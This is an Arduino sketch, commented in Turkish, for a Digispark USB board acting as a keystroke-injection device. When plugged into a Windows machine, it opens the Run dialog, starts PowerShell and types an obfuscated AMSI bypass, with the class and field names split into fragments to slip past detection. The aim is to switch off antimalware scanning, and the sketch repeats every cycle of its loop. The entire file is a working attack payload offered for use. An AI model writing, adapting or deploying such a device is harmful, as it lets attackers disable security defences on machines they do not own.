

#include "DigiKeyboard.h"

void setup() {pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
 
  // İlk olarak klavye tanımlaması yapılır.
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows + R kombinasyonu
    
  DigiKeyboard.delay(1000); // 1 saniye bekleme
    DigiKeyboard.print("powershell.exe");
    
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter tuşuna basma
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.print("amsi=[Ref].Assembly.GetType('Sys'+'te'+'m.M'+'anage'+'ment.A'+'utom'+'ation.Am'+'siU'+'tils')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter tuşuna basma
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.print("field=");
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.print("amsi.GetField('ams'+'iInitF'+'ailed','NonP'+'ublic,S'+'tatic')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter tuşuna basma
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.print("field.SetValue(");
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); // Alt + 4 kombinasyonu
  DigiKeyboard.delay(1000); // 1 saniye bekleme
  DigiKeyboard.print("null)");
    
    digitalWrite(1, HIGH); //turn on led when program finishes - You can unplug now
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
